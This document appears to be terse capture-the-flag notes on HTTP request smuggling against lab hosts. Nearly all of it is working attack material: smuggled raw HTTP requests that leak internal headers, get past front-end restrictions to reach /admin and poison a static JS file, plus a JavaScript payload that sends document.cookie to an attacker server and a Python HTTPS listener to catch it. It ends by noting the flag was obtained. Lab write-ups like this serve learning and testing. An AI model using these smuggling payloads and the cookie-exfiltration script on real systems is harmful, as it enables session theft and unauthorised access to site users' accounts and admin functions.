




```HTTP
POST / HTTP/2
Host: 10.10.93.232:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Content-Length: 0

GET /post/like/12315198742342 HTTP/1.1
X: f
```




Leaking internal headers 

header foo
```
bar
Host: 10.10.95.208:8100

POST /hello HTTP/1.1
Content-Length: 300
Host: 10.10.95.208:8100
Content-Type: application/x-www-form-urlencoded

q=
```

![](../../../Pasted%20image%2020250823002720.png)

bypass frontend restrictions
```
bar
Host: 10.10.95.208:8100

GET /admin HTTP/1.1
X-fake: a
```



------
```
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
       document.getElementById("demo").innerHTML = xhttp.responseText;
    }
};
xhttp.open("GET", "https://10.8.150.149:8002/?c=" + document.cookie, true);
xhttp.send();

```

Setup server:
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

# handler mínimo só para responder com algo
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Servidor HTTPS ativo!\n")

# cria servidor
httpd = HTTPServer(("0.0.0.0", 8002), SimpleHandler)

# cria contexto SSL
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

# aplica SSL no socket
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

print("Servidor HTTPS a correr em https://0.0.0.0:8002")
httpd.serve_forever()

```


```HTTP
GET /static/text.js HTTP/2
Host: 10.10.95.208:8100
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Pragma: no-cache
Foo: bar
```

```
bar
Host: 10.10.95.208:8100

GET /static/uploads/myjs.js HTTP/
```

Sent and revieved the flag
